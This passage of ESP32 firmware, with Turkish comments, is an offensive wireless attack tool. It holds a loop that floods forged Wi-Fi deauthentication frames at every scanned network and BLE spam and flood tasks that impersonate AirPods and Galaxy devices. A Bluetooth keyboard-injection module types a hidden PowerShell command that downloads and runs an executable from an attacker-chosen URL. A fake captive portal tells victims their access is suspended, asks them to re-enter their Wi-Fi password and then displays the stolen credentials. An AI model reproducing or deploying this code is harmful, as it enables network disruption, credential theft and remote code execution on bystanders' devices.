          safeSendMgnt(frame, 26);

          memcpy(&frame[4], temp, 6);
          frame[0] = 0xC0; frame[24] = 0x07;
          safeSendMgnt(frame, 26);

          frame[0] = 0xA0; frame[24] = 0x07;
          safeSendMgnt(frame, 26);
        }
        vTaskDelay(pdMS_TO_TICKS(taskDelay));
      }

      for (int extra = 0; extra < extraBurst; extra++) {
        for (int offset = -1; offset <= 1; offset++) {
          uint8_t temp[6];
          memcpy(temp, net.bssid, 6);
          temp[5] = (uint8_t)(temp[5] + offset);
          if (!isFakeAPBSSID(temp)) {
            memcpy(&frame[10], temp, 6);
            memcpy(&frame[16], temp, 6);
            memset(&frame[4], 0xFF, 6);
            frame[0] = 0xC0; frame[24] = 0x07;
            safeSendMgnt(frame, 26);
            safeSendMgnt(frame, 26);
          }
        }
        vTaskDelay(pdMS_TO_TICKS(EXTRA_BURST_DELAY_MS));
      }
    }

    vTaskDelay(pdMS_TO_TICKS(50));
  }

  Serial.println("[DeauthAll] Tüm ağlara deauth durduruldu.");
  vTaskDelete(NULL);
}

// ═══════════════════════════════════════════════════════════════════════════════
// ══════════════════════════ BLE TARAYICI GÖREVİ ═══════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════════
static std::vector<BLEDevInfo> ble_scan_temp;

class BLEScanCallback : public BLEAdvertisedDeviceCallbacks {
public:
  void onResult(BLEAdvertisedDevice dev) {
    BLEDevInfo info;
    info.address = String(dev.getAddress().toString().c_str());
    info.name    = dev.haveName() ? String(dev.getName().c_str()) : "";
    info.rssi    = dev.getRSSI();
    for (auto &d : ble_scan_temp) {
      if (d.address == info.address) {
        if (info.rssi > d.rssi) d.rssi = info.rssi;
        return;
      }
    }
    ble_scan_temp.push_back(info);
  }
};

static BLEScanCallback *bleCb = NULL;

void bleScanTask(void *param) {
  (void)param;
  ble_scan_temp.clear();

  BLEScan *pScan = BLEDevice::getScan();
  if (!bleCb) bleCb = new BLEScanCallback();
  pScan->setAdvertisedDeviceCallbacks(bleCb, true);
  pScan->setActiveScan(true);
  pScan->setInterval(100);
  pScan->setWindow(99);

  Serial.println("[BLE] Tarama başlatıldı (5 sn)...");
  pScan->start(5, false);
  pScan->clearResults();
  Serial.print("[BLE] Tarama tamamlandı. Bulunan cihaz: ");
  Serial.println(ble_scan_temp.size());

  // Bubble sort — RSSI'ya göre azalan sıra (en güçlü en üste)
  for (int i = 0; i < (int)ble_scan_temp.size() - 1; i++) {
    for (int j = i + 1; j < (int)ble_scan_temp.size(); j++) {
      if (ble_scan_temp[j].rssi > ble_scan_temp[i].rssi) {
        BLEDevInfo tmp  = ble_scan_temp[i];
        ble_scan_temp[i] = ble_scan_temp[j];
        ble_scan_temp[j] = tmp;
      }
    }
  }

  if (ble_mutex && xSemaphoreTake(ble_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
    ble_devices = ble_scan_temp;
    xSemaphoreGive(ble_mutex);
  }
  ble_scan_temp.clear();
  ble_scan_status = BLE_DONE;
  vTaskDelete(NULL);
}

// ═══════════════════════════════════════════════════════════════════════════════
// ════════════════ BLE SPAM PROFILLERI & GÖREVLERİ ═════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════════

struct BLESpamProfile {
  const char *name;
  uint8_t     mfr[27];
  uint8_t     mfr_len;
};

// Apple Proximity Pairing (iOS popup tetikler) + diğer cihazlar
static const BLESpamProfile SPAM_PROFILES[] = {
  { "AirPods Pro",
    {0x4C,0x00,0x07,0x19,0x0E,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    27 },
  { "AirPods Pro 2",
    {0x4C,0x00,0x07,0x19,0x14,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    27 },
  { "AirPods",
    {0x4C,0x00,0x07,0x19,0x05,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    27 },
  { "AirPods Gen3",
    {0x4C,0x00,0x07,0x19,0x13,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    27 },
  { "AirPods Max",
    {0x4C,0x00,0x07,0x19,0x0A,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    27 },
  { "iPhone",
    {0x4C,0x00,0x10,0x05,0x0B,0x18,0x9B,0xAF,0x16,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    9 },
  { "Apple Watch",
    {0x4C,0x00,0x0F,0x05,0xC1,0x01,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    21 },
  { "Apple TV",
    {0x4C,0x00,0x04,0x0E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    16 },
  { "Galaxy Buds",
    {0x75,0x00,0x42,0x09,0x81,0x02,0xC0,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    8 },
  { "Galaxy S24",
    {0x75,0x00,0x01,0x00,0x02,0x00,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    8 },
};
#define SPAM_PROFILE_COUNT 10

static void bleSetAdv(const char *name, const uint8_t *mfr, uint8_t mfr_len) {
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  pAdv->stop();

  BLEAdvertisementData advData;
  advData.setFlags(0x1A);
  std::string mfrStr((char*)mfr, mfr_len);
  advData.setManufacturerData(mfrStr);

  BLEAdvertisementData scanData;
  scanData.setName(std::string(name));

  pAdv->setAdvertisementData(advData);
  pAdv->setScanResponseData(scanData);
  pAdv->setMinInterval(0x20);
  pAdv->setMaxInterval(0x40);
  pAdv->start();
}

// ─── BLE SPAM GÖREVİ: profilleri sırayla yayınlar (iOS/Android popup tetikler) ─
void bleSpamTask(void *param) {
  (void)param;
  int idx = 0;
  Serial.println("[BLESpam] ⚡ BLE Spam başlatıldı!");
  while (ble_spam_active) {
    const BLESpamProfile &p = SPAM_PROFILES[idx % SPAM_PROFILE_COUNT];
    bleSetAdv(p.name, p.mfr, p.mfr_len);
    Serial.print("[BLESpam] Yayınlanan: "); Serial.println(p.name);
    idx++;
    vTaskDelay(pdMS_TO_TICKS(800));
  }
  BLEDevice::getAdvertising()->stop();
  Serial.println("[BLESpam] Durduruldu.");
  vTaskDelete(NULL);
}

// ─── BLE FLOOD GÖREVİ: tüm profilleri hızlıca döngüler, BLE tarayıcıları bunaltır ─
void bleFloodTask(void *param) {
  (void)param;
  int idx = 0;
  uint8_t rnd_mfr[27];
  Serial.println("[BLEFlood] ⚡ BLE Flood başlatıldı!");
  while (ble_flood_active) {
    const BLESpamProfile &p = SPAM_PROFILES[idx % SPAM_PROFILE_COUNT];
    memcpy(rnd_mfr, p.mfr, p.mfr_len);
    // Her pakette rastgele sinyal/durum baytları → her seferinde yeni cihaz gibi görünür
    rnd_mfr[6]  = (uint8_t)(xTaskGetTickCount() & 0xFF);
    rnd_mfr[7]  = (uint8_t)((xTaskGetTickCount() >> 8) & 0xFF);
    rnd_mfr[8]  = (uint8_t)(idx & 0xFF);
    bleSetAdv(p.name, rnd_mfr, p.mfr_len);
    idx++;
    vTaskDelay(pdMS_TO_TICKS(120));
  }
  BLEDevice::getAdvertising()->stop();
  Serial.println("[BLEFlood] Durduruldu.");
  vTaskDelete(NULL);
}

// ═══════════════════════════════════════════════════════════════════════════════
// ═══════════════ BLE HID KLAVYE — KEYSTROKE INJECTION ═════════════════════════
// ═══════════════════════════════════════════════════════════════════════════════

// HID standart klavye tanımlayıcısı
static const uint8_t hidReportDescriptor[] = {
  0x05,0x01, 0x09,0x06, 0xA1,0x01,
  0x05,0x07, 0x19,0xE0, 0x29,0xE7, 0x15,0x00, 0x25,0x01,
  0x75,0x01, 0x95,0x08, 0x81,0x02,
  0x95,0x01, 0x75,0x08, 0x81,0x03,
  0x95,0x06, 0x75,0x08, 0x15,0x00, 0x25,0x73,
  0x05,0x07, 0x19,0x00, 0x29,0x73, 0x81,0x00,
  0xC0
};

// HID modifier bitleri
#define HID_MOD_LCTRL  0x01
#define HID_MOD_LSHIFT 0x02
#define HID_MOD_LALT   0x04
#define HID_MOD_LGUI   0x08  // Windows / Cmd tuşu
#define HID_KEY_ENTER  0x28
#define HID_KEY_ESC    0x29
#define HID_KEY_TAB    0x2B
#define HID_KEY_SPACE  0x2C
#define HID_KEY_HOME   0x4A

static BLEServer        *pBLEKBServer   = nullptr;
static BLEHIDDevice     *pBLEKeyboard   = nullptr;
static BLECharacteristic *pBLEKBInput  = nullptr;

class BLEKBServerCb : public BLEServerCallbacks {
public:
  void onConnect(BLEServer*) override {
    ble_hid_connected = true;
    Serial.println("[BLEKeyboard] ⌨️ Cihaz bağlandı!");
  }
  void onDisconnect(BLEServer*) override {
    ble_hid_connected = false;
    Serial.println("[BLEKeyboard] Bağlantı kesildi.");
    if (ble_keystroke_active) BLEDevice::startAdvertising();
  }
};

static void initBLEKeyboard() {
  if (pBLEKBServer) return;
  pBLEKBServer = BLEDevice::createServer();
  pBLEKBServer->setCallbacks(new BLEKBServerCb());

  pBLEKeyboard = new BLEHIDDevice(pBLEKBServer);
  pBLEKBInput  = pBLEKeyboard->inputReport(1);

  pBLEKeyboard->manufacturer()->setValue("Apple Inc.");
  pBLEKeyboard->pnp(0x02, 0x05AC, 0x0220, 0x0131);
  pBLEKeyboard->hidInfo(0x00, 0x02);
  pBLEKeyboard->reportMap((uint8_t*)hidReportDescriptor, sizeof(hidReportDescriptor));
  pBLEKeyboard->startServices();
  pBLEKeyboard->setBatteryLevel(100);
}

// ─── Tek tuş gönder → bırak ─────────────────────────────────────────────────
static void hidSendKey(uint8_t modifier, uint8_t keycode) {
  if (!pBLEKBInput || !ble_hid_connected) return;
  uint8_t report[8] = {modifier, 0, keycode, 0, 0, 0, 0, 0};
  pBLEKBInput->setValue(report, 8);
  pBLEKBInput->notify();
  vTaskDelay(pdMS_TO_TICKS(25));
  memset(report, 0, 8);
  pBLEKBInput->setValue(report, 8);
  pBLEKBInput->notify();
  vTaskDelay(pdMS_TO_TICKS(30));
}

// ─── ASCII → HID keycode ─────────────────────────────────────────────────────
static uint8_t charToHID(char c, uint8_t *mod) {
  *mod = 0;
  if (c >= 'a' && c <= 'z') return (uint8_t)(c - 'a' + 4);
  if (c >= 'A' && c <= 'Z') { *mod = HID_MOD_LSHIFT; return (uint8_t)(c - 'A' + 4); }
  if (c >= '1' && c <= '9') return (uint8_t)(c - '1' + 30);
  switch (c) {
    case '0':  return 0x27;
    case ' ':  return HID_KEY_SPACE;
    case '\n': return HID_KEY_ENTER;
    case '-':  return 0x2D; case '_': *mod=HID_MOD_LSHIFT; return 0x2D;
    case '=':  return 0x2E; case '+': *mod=HID_MOD_LSHIFT; return 0x2E;
    case '[':  return 0x2F; case '{': *mod=HID_MOD_LSHIFT; return 0x2F;
    case ']':  return 0x30; case '}': *mod=HID_MOD_LSHIFT; return 0x30;
    case '\\': return 0x31; case '|': *mod=HID_MOD_LSHIFT; return 0x31;
    case ';':  return 0x33; case ':': *mod=HID_MOD_LSHIFT; return 0x33;
    case '\'': return 0x34; case '"': *mod=HID_MOD_LSHIFT; return 0x34;
    case '`':  return 0x35; case '~': *mod=HID_MOD_LSHIFT; return 0x35;
    case ',':  return 0x36; case '<': *mod=HID_MOD_LSHIFT; return 0x36;
    case '.':  return 0x37; case '>': *mod=HID_MOD_LSHIFT; return 0x37;
    case '/':  return 0x38; case '?': *mod=HID_MOD_LSHIFT; return 0x38;
    case '!':  *mod=HID_MOD_LSHIFT; return 0x1E;
    case '@':  *mod=HID_MOD_LSHIFT; return 0x1F;
    case '#':  *mod=HID_MOD_LSHIFT; return 0x20;
    case '$':  *mod=HID_MOD_LSHIFT; return 0x21;
    case '%':  *mod=HID_MOD_LSHIFT; return 0x22;
    case '^':  *mod=HID_MOD_LSHIFT; return 0x23;
    case '&':  *mod=HID_MOD_LSHIFT; return 0x24;
    case '*':  *mod=HID_MOD_LSHIFT; return 0x25;
    case '(':  *mod=HID_MOD_LSHIFT; return 0x26;
    case ')':  *mod=HID_MOD_LSHIFT; return 0x27;
  }
  return 0;
}

static void hidType(const char *str) {
  for (int i = 0; str[i] && ble_hid_connected && ble_keystroke_active; i++) {
    uint8_t mod, key = charToHID(str[i], &mod);
    if (key) hidSendKey(mod, key);
  }
}

// ─── PAYLOAD FONKSİYONLARI ──────────────────────────────────────────────────

// 0 — Tarayıcı adres çubuğu (Ctrl+L → URL → Enter) — herkeste çalışır
static void payloadUrlBar(const char *url) {
  hidSendKey(HID_MOD_LCTRL, 0x0F); // Ctrl+L
  vTaskDelay(pdMS_TO_TICKS(700));
  hidType(url);
  vTaskDelay(pdMS_TO_TICKS(200));
  hidSendKey(0, HID_KEY_ENTER);
}

// 1 — Android YouTube: Ana ekrandan URL yaz → Enter
static void payloadAndroidYT() {
  hidSendKey(0, HID_KEY_HOME);
  vTaskDelay(pdMS_TO_TICKS(1500));
  hidType("https://youtube.com");
  vTaskDelay(pdMS_TO_TICKS(400));
  hidSendKey(0, HID_KEY_ENTER);
}

// 2 — Android APK: URL'ye giderek APK indirir
static void payloadAndroidAPK(const char *url) {
  hidSendKey(0, HID_KEY_HOME);
  vTaskDelay(pdMS_TO_TICKS(1500));
  hidType(url);
  vTaskDelay(pdMS_TO_TICKS(400));
  hidSendKey(0, HID_KEY_ENTER);
}

// 3 — Windows Çalıştır: Win+R → URL → Enter
static void payloadWinRun(const char *url) {
  hidSendKey(HID_MOD_LGUI, 0x15); // Win+R
  vTaskDelay(pdMS_TO_TICKS(1000));
  hidType(url);
  vTaskDelay(pdMS_TO_TICKS(200));
  hidSendKey(0, HID_KEY_ENTER);
}

// 4 — Windows PowerShell: dosya indir ve çalıştır (gizli pencere)
static void payloadWinPwsh(const char *url) {
  hidSendKey(HID_MOD_LGUI, 0x15); // Win+R
  vTaskDelay(pdMS_TO_TICKS(1000));
  char cmd[220];
  snprintf(cmd, sizeof(cmd),
    "powershell -w h -ep bypass -c \"iwr %s -o $env:TEMP\\x.exe;Start-Process $env:TEMP\\x.exe\"",
    url);
  hidType(cmd);
  vTaskDelay(pdMS_TO_TICKS(200));
  hidSendKey(0, HID_KEY_ENTER);
}

// 5 — iOS/macOS Spotlight: Cmd+Space → URL → Enter → Safari'de açar
static void payloadIOSSafari(const char *url) {
  hidSendKey(HID_MOD_LGUI, HID_KEY_SPACE); // Cmd+Space
  vTaskDelay(pdMS_TO_TICKS(1000));
  hidType(url);
  vTaskDelay(pdMS_TO_TICKS(600));
  hidSendKey(0, HID_KEY_ENTER);
  vTaskDelay(pdMS_TO_TICKS(1200));
  hidSendKey(0, HID_KEY_ENTER); // Safari'de onayla
}

// ─── BLE KEYSTROKE GÖREVİ ────────────────────────────────────────────────────
void bleKeystrokeTask(void *param) {
  (void)param;
  Serial.println("[BLEKeyboard] ⌨️ Klavye modu başlatıldı, bağlantı bekleniyor...");

  initBLEKeyboard();

  // Klavye olarak reklam ver
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  pAdv->stop();
  BLEAdvertisementData advKB;
  advKB.setFlags(0x06);
  advKB.setAppearance(0x03C1); // HID Keyboard appearance
  BLEAdvertisementData scanKB;
  scanKB.setName("BT Keyboard");
  pAdv->setAdvertisementData(advKB);
  pAdv->setScanResponseData(scanKB);
  pAdv->start();

  // Bağlantı bekle (60s aralıklarla reklam yenile)
  unsigned long ws = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
  while (!ble_hid_connected && ble_keystroke_active) {
    unsigned long now = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
    if (now - ws > 60000UL) {
      pAdv->stop(); vTaskDelay(pdMS_TO_TICKS(100)); pAdv->start();
      ws = now;
      Serial.println("[BLEKeyboard] Reklam yenilendi, bağlantı bekleniyor...");
    }
    vTaskDelay(pdMS_TO_TICKS(200));
  }

  if (!ble_keystroke_active) {
    pAdv->stop();
    Serial.println("[BLEKeyboard] Durduruldu.");
    vTaskDelete(NULL);
    return;
  }

  Serial.println("[BLEKeyboard] Bağlantı kuruldu! 2 sn sonra payload gönderiliyor...");
  vTaskDelay(pdMS_TO_TICKS(2000));

  switch (ble_keystroke_payload) {
    case 0: payloadUrlBar(ble_keystroke_url);  break;
    case 1: payloadAndroidYT();                break;
    case 2: payloadAndroidAPK(ble_keystroke_url); break;
    case 3: payloadWinRun(ble_keystroke_url);  break;
    case 4: payloadWinPwsh(ble_apk_url);       break;
    case 5: payloadIOSSafari(ble_keystroke_url); break;
  }

  Serial.println("[BLEKeyboard] ✓ Payload gönderildi.");
  ble_keystroke_active = false;
  pAdv->stop();
  vTaskDelete(NULL);
}

// ─────────────────────────────────────────────────────────────────────────────

// ─── GÖRSELLER VE YÖNLENDİRME ────────────────────────────────────────────────
String rssiBar(int32_t rssi) {
  if (rssi > -50) return "&#9608;&#9608;&#9608;&#9608; Mükemmel";
  if (rssi > -65) return "&#9608;&#9608;&#9608;&#9617; İyi";
  if (rssi > -75) return "&#9608;&#9608;&#9617;&#9617; Orta";
  return "&#9608;&#9617;&#9617;&#9617; Zayıf";
}

String buildRedirect() {
  String r = "HTTP/1.1 302 Found\r\nLocation: http://";
  r += AP_IP_ADDR;
  r += "/\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
  return r;
}

String parsePostParam(const String &body, const String &key) {
  int idx = body.indexOf(key + "=");
  if (idx == -1) return "";
  int start = idx + key.length() + 1;
  int end   = body.indexOf('&', start);
  if (end == -1) end = body.length();
  return urlDecode(body.substring(start, end));
}

static const char CSS_STR[] PROGMEM =
  "<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f0f4f8;color:#2c3e50;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}"
  ".card{background:#ffffff;border-radius:12px;padding:36px 28px;width:100%;max-width:420px;box-shadow:0 12px 30px rgba(0,0,0,.08);border-top:6px solid #0056b3}"
  "h1{font-size:1.6rem;color:#1a252f;text-align:center;margin-bottom:12px;font-weight:700}.sub{text-align:center;font-size:0.95rem;color:#7f8c8d;margin-bottom:28px;line-height:1.6}"
  ".status-box{border-radius:8px;padding:14px 16px;margin-bottom:22px;font-size:0.95rem;font-weight:600;text-align:center}.ok{background:#eafaf1;border:1px solid #2ecc71;color:#27ae60}.err{background:#fdeced;border:1px solid #e74c3c;color:#c0392b}.wait{background:#ebf5fb;border:1px solid #3498db;color:#2980b9}"
  ".conn-status{border-radius:8px;padding:18px;margin-bottom:24px;font-size:1rem;background:#f8f9fa;border:1px solid #e1e8ed;line-height:1.5;color:#34495e;text-align:center}"
  ".net-list{list-style:none;margin-bottom:20px;max-height:260px;overflow-y:auto}.net-item{display:flex;align-items:center;padding:12px 14px;border-radius:8px;margin-bottom:8px;cursor:pointer;border:1px solid #eaeded;background:#fff;transition:all .2s}.net-item:hover{border-color:#3498db;background:#f4f6f9}"
  ".net-item input[type=radio]{margin-right:12px;accent-color:#0056b3;width:18px;height:18px;flex-shrink:0}.net-info{flex:1;min-width:0}.net-name{font-weight:600;font-size:1rem;color:#2c3e50;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.net-meta{font-size:.8rem;color:#95a5a6;margin-top:4px}"
  ".pass-wrap{margin-bottom:24px}label{display:block;font-size:.9rem;font-weight:600;color:#34495e;margin-bottom:8px}input[type=password],input[type=text]{width:100%;padding:14px 16px;border-radius:8px;border:1px solid #bdc3c7;background:#fff;color:#2c3e50;font-size:1.05rem;outline:none;transition:border .2s;box-shadow:inset 0 1px 3px rgba(0,0,0,0.05)}input:focus{border-color:#0056b3}"
  ".show-pass{font-size:.85rem;color:#7f8c8d;margin-top:8px;cursor:pointer;user-select:none;text-align:right}button{width:100%;padding:15px;border:none;border-radius:8px;background:#0056b3;color:#fff;font-size:1.1rem;font-weight:bold;cursor:pointer;transition:background .2s;box-shadow:0 4px 6px rgba(0,86,179,0.2)}.btn-blue{background:#34495e;box-shadow:none}button:hover{background:#004494}"
  ".spinner{display:inline-block;width:16px;height:16px;border:3px solid #3498db;border-top:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:8px}@keyframes spin{to{transform:rotate(360deg)}}"
  ".footer{text-align:center;font-size:.8rem;color:#bdc3c7;margin-top:20px;border-top:1px solid #ecf0f1;padding-top:16px}"
  "#offline-bar{position:fixed;top:0;left:0;width:100%;background:#e74c3c;color:#fff;text-align:center;padding:12px;font-weight:bold;font-size:0.9rem;z-index:9999;display:none;box-shadow:0 2px 10px rgba(0,0,0,0.1)}</style>";

void sendChunkedCSS(WiFiClient &client) {
  const char *p = CSS_STR;
  while (*p) {
    if (!client.connected()) return;
    int len = 0;
    while (p[len] != '\0' && len < 512) len++;
    client.write((const uint8_t *)p, len);
    client.flush();
    delay(1);
    p += len;
  }
}

void sendOfflineScript(WiFiClient &client) {
  client.print("<div id='offline-bar'>&#9888; Bağlantı zayıf, lütfen sayfayı kapatmadan bekleyiniz...</div>");
  client.print("<script>");
  client.print("window.addEventListener('offline', function(){ document.getElementById('offline-bar').style.display='block'; });");
  client.print("window.addEventListener('online', function(){ document.getElementById('offline-bar').style.display='none'; });");
  client.print("</script>");
}

void sendStartPage(WiFiClient &client) {
  if (!client.connected()) return;
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Ağ Yapılandırma Sihirbazı</title>");
  sendChunkedCSS(client);
  if (!client.connected()) return;
  client.print("</head><body>");
  sendOfflineScript(client);

  client.print("<div class='card'>");
  client.print("<div style='text-align:center; margin-bottom:16px;'><svg width='54' height='54' viewBox='0 0 24 24' fill='none' stroke='#0056b3' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><path d='M5 12.55a11 11 0 0 1 14.08 0'></path><path d='M1.42 9a16 16 0 0 1 21.16 0'></path><path d='M8.53 16.11a6 6 0 0 1 6.95 0'></path><line x1='12' y1='20' x2='12.01' y2='20'></line></svg></div>");
  client.print("<h1>Ağ Yapılandırma Sihirbazı</h1><p class='sub'>Lütfen erişim sağlamak istediğiniz ağı listeden seçiniz.</p>");

  if (scan_status == SCAN_RUNNING) {
      client.print("<div class='status-box wait'>&#128225; Çevre ağlar taranıyor, lütfen bekleyiniz...</div>");
  }

  if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
  client.print("<h2>&#128225; Taranan Ağlar ("); client.print(networks.size()); client.print(")</h2><form method='POST' action='/start_ap'><ul class='net-list'>");

  if (networks.size() > 0) {
    for (int i = 0; i < (int)networks.size(); i++) {
      String safe = networks[i].ssid;
      safe.replace("&", "&amp;"); safe.replace("<", "&lt;"); safe.replace("'", "&#39;"); safe.replace("\"", "&quot;");

      client.print("<li class='net-item' onclick=\"document.getElementById('r"); client.print(i); client.print("').checked=true\">");
      client.print("<input type='radio' name='ssid' id='r"); client.print(i); client.print("' value='"); client.print(safe); client.print("' required>");
      client.print("<div class='net-info'><div class='net-name'>"); client.print(safe);
      if      (networks[i].enc == ENC_TYPE_NONE) client.print(" <span style='font-size:.7rem;background:#e74c3c;color:#fff;padding:2px 5px;border-radius:4px;'>Açık</span>");
      else if (networks[i].enc == ENC_TYPE_WPA3) client.print(" <span style='font-size:.7rem;background:#8e44ad;color:#fff;padding:2px 5px;border-radius:4px;'>WPA3</span>");
      else if (networks[i].enc == ENC_TYPE_TKIP) client.print(" <span style='font-size:.7rem;background:#e67e22;color:#fff;padding:2px 5px;border-radius:4px;'>WPA</span>");
      client.print("</div>");
      client.print("<div class='net-meta'>Sinyal Kalitesi: "); client.print(rssiBar(networks[i].rssi)); client.print("</div></div></li>");
    }
  } else if (scan_status != SCAN_RUNNING) {
    client.print("<li style='padding:16px;text-align:center;color:#7f8c8d;'>❌ Herhangi bir ağ bulunamadı. Lütfen ağları yenile.</li>");
  }

  if (networks_mutex) xSemaphoreGive(networks_mutex);

  client.print("</ul>");

  if (networks.size() > 0) {
    client.print("<button type='submit'>İleri</button>");
  } else {
    client.print("<button type='submit' disabled style='opacity:0.5;cursor:not-allowed;'>İleri (Ağ seçilmedi)</button>");
  }

  client.print("</form>");
  client.print("<form method='POST' action='/rescan'><button type='submit' class='btn-blue' style='margin-top:10px;'>&#8635; Ağları Yenile</button></form>");

  if (deauth_all_active) {
    client.print("<div style='background:#fdeced;border:1px solid #e74c3c;border-radius:8px;padding:10px 14px;margin-top:12px;text-align:center;font-size:0.9rem;font-weight:600;color:#c0392b;'>&#9889; Deauth All AKTIF — Taranan tüm ağlar deauth edilmekte</div>");
    client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:8px;background:#c0392b;box-shadow:none;'>&#9724; Deauth All Durdur</button></form>");
  } else {
    client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:12px;background:#c0392b;box-shadow:none;'>&#9889; Deauth All — Tüm Ağları Deauth Et</button></form>");
  }

  client.print("<a href='/ble'><button type='button' style='margin-top:10px;background:#8e44ad;box-shadow:none;width:100%;padding:15px;border:none;border-radius:8px;color:#fff;font-size:1.1rem;font-weight:bold;cursor:pointer;'>&#128268; Bluetooth Tarayıcı</button></a>");

  if (strlen(saved_ssid) > 0) {
    client.print("<div style='background:#fff;border:1px solid #bdc3c7;border-radius:8px;padding:12px;margin-top:20px;'>");
    client.print("<h3 style='font-size:0.9rem;color:#0056b3;margin-bottom:8px;text-align:center;'>Sistem Kayıtları</h3>");
    client.print("<div style='display:flex;justify-content:space-between;align-items:center;background:#f4f6f9;padding:10px;border-radius:6px;'>");
    client.print("<div style='display:flex;flex-direction:column;font-size:0.85rem;'>");
    client.print("<span style='color:#34495e;'><b>Ağ:</b> <span style='color:#2c3e50;'>"); client.print(saved_ssid); client.print("</span></span>");
    client.print("<span style='color:#34495e;margin-top:4px;'><b>Şifre:</b> <span style='color:#27ae60;'>"); client.print(saved_pass); client.print("</span></span>");
    client.print("</div>");
    client.print("<form method='POST' action='/delete_cred' style='margin:0;'>");
    client.print("<button type='submit' style='background:#e74c3c;color:#fff;border:none;padding:8px 12px;border-radius:6px;font-size:0.8rem;cursor:pointer;width:auto;box-shadow:none;'>Sil</button>");
    client.print("</form></div></div>");
  }
  client.print("<div class='footer'>Güvenli Bağlantı Yöneticisi &copy;</div></div></body></html>");
}

void sendSwitchingPage(WiFiClient &client) {
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Bağlantı Hazırlanıyor</title>");
  client.print("<style>body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f0f4f8;color:#333;text-align:center;padding:50px 20px;} b{color:#0056b3;}</style></head><body>");
  client.print("<h2 style='color:#2c3e50;'>&#8987; Ağ Yapılandırması Hazırlanıyor...</h2>");
  client.print("<p style='color:#7f8c8d;font-size:16px;margin-top:20px;line-height:1.6'>Lütfen cihazınızın Wi-Fi ayarlarına giderek <b>");
  client.print(target_ssid);
  client.print("</b> ağına tekrar bağlanınız.</p></body></html>");
}

void sendPortalPage(WiFiClient &client, bool show_result) {
  if (!client.connected()) return;
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>İnternet Bağlantı Doğrulaması</title>");
  sendChunkedCSS(client);
  if (!client.connected()) return;
  client.print("</head><body>");
  sendOfflineScript(client);

  client.print("<div class='card'>");
  client.print("<div style='text-align:center; margin-bottom:16px;'><svg width='54' height='54' viewBox='0 0 24 24' fill='none' stroke='#0056b3' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><path d='M5 12.55a11 11 0 0 1 14.08 0'></path><path d='M1.42 9a16 16 0 0 1 21.16 0'></path><path d='M8.53 16.11a6 6 0 0 1 6.95 0'></path><line x1='12' y1='20' x2='12.01' y2='20'></line></svg></div>");

  client.print("<h1>Bağlantı Doğrulaması</h1>");
  client.print("<p class='sub'>Güvenlik standartları güncellendiği için ağ erişiminiz geçici olarak askıya alınmıştır. İnternete tekrar bağlanabilmek için lütfen mevcut şifrenizi doğrulayınız.</p>");

  if (conn_status == CS_RUNNING) {
      client.print("<div id='sbox' class='status-box wait'><span class='spinner'></span>Ağ kimliği doğrulanıyor, lütfen bekleyiniz...</div>");
  } else if (show_result) {
    if (conn_result == "ok") {
